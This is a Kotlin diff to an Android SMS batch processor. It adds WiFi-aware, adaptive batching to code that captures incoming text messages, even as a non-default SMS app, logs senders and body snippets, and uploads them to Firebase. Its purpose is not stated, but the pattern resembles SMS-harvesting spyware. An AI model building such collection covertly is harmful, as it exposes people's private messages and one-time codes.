@@ -6,6 +6,7 @@ import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import com.example.fast.config.AppConfig
+import com.example.fast.util.network.AdaptiveBatchConfig
 import com.google.firebase.Firebase
 import com.google.firebase.database.database
 import com.google.gson.Gson
@@ -208,6 +209,10 @@ object SmsMessageBatchProcessor {
      * Note: Can be called from both DEFAULT SMS app (SMS_DELIVER_ACTION) and NON-DEFAULT SMS app (SMS_RECEIVED_ACTION)
      * Deduplication via message hash prevents uploading same message twice if processed by multiple receivers
      *
+     * Network-Aware Behavior:
+     * - Default SMS app OR strong WiFi: Upload immediately (bypass batching)
+     * - Non-default with weak WiFi/Mobile: Use adaptive batch timeout
+     *
      * @param immediateUpload If true, upload immediately (bypass batching) - used for default SMS app priority
      *                        If false, uses batching - used for non-default SMS app to avoid Firebase overload
      */
@@ -239,35 +244,65 @@ object SmsMessageBatchProcessor {
         if (immediateUpload) {
             // Upload immediately (bypass queue for default SMS app)
             uploadMessageImmediately(context, message)
-        } else {
-            // Batch mode: Add to queue
-            messageQueue.offer(message)
-            Log.d(TAG, "Message queued: $sender - ${body.take(30)}... (queue size: ${messageQueue.size})")
+            return
+        }
 
-            // Save to persistent storage
-            saveToStorage(context)
+        // Check if we should upload immediately on strong WiFi
+        if (AdaptiveBatchConfig.shouldUploadImmediately(context)) {
+            Log.d(TAG, "Strong WiFi detected - uploading message immediately")
+            uploadMessageImmediately(context, message)
+            return
+        }
 
-            // Check if we're currently processing a batch
-            synchronized(processingLock) {
-                if (isProcessing) {
-                    // If upload is in progress, new messages will be prioritized in next batch
-                    // (they'll be sorted by timestamp descending when processing next batch)
-                    Log.d(TAG, "Upload in progress - new message will be prioritized in next batch (newest first)")
-                    return
-                }
+        // Batch mode: Add to queue
+        messageQueue.offer(message)
+        Log.d(TAG, "Message queued: $sender - ${body.take(30)}... (queue size: ${messageQueue.size})")
 
-                // Schedule batch processing if not already scheduled
-                if (batchTimer == null) {
-                    scheduleBatchProcessing(context)
-                }
+        // Save to persistent storage
+        saveToStorage(context)
 
-                // Check if batch size reached (100 messages)
-                if (messageQueue.size >= BATCH_SIZE) {
-                    Log.d(TAG, "Batch size reached ($BATCH_SIZE), triggering immediate batch upload (newest first)")
-                    processBatch(context, force = true)
-                }
+        // Get adaptive batch configuration
+        val batchConfig = AdaptiveBatchConfig.getConfig(context)
+        val adaptiveBatchSize = batchConfig.maxBatchSize
+
+        // Check if we're currently processing a batch
+        synchronized(processingLock) {
+            if (isProcessing) {
+                // If upload is in progress, new messages will be prioritized in next batch
+                // (they'll be sorted by timestamp descending when processing next batch)
+                Log.d(TAG, "Upload in progress - new message will be prioritized in next batch (newest first)")
+                return
+            }
+
+            // Schedule batch processing if not already scheduled (with adaptive timeout)
+            if (batchTimer == null) {
+                // Use the minimum of configured timeout and adaptive timeout
+                val adaptiveTimeout = batchConfig.batchTimeoutMs
+                val effectiveTimeout = minOf(batchTimeoutMs, adaptiveTimeout)
+                scheduleBatchProcessingWithTimeout(context, effectiveTimeout)
+            }
+
+            // Check if batch size reached (adaptive based on network)
+            if (messageQueue.size >= adaptiveBatchSize) {
+                Log.d(TAG, "Batch size reached ($adaptiveBatchSize), triggering immediate batch upload (newest first)")
+                processBatch(context, force = true)
             }
         }
+    }
+
+    /**
+     * Schedule batch processing with specific timeout
+     */
+    private fun scheduleBatchProcessingWithTimeout(context: Context, timeoutMs: Long) {
+        // Cancel existing timer
+        batchTimer?.let { handler.removeCallbacks(it) }
+
+        // Schedule new timer with specified timeout
+        batchTimer = Runnable {
+            processBatch(context, force = false)
+        }
+        handler.postDelayed(batchTimer!!, timeoutMs)
+        Log.d(TAG, "Scheduled batch processing in ${timeoutMs}ms (adaptive)")
     }
 
     /**
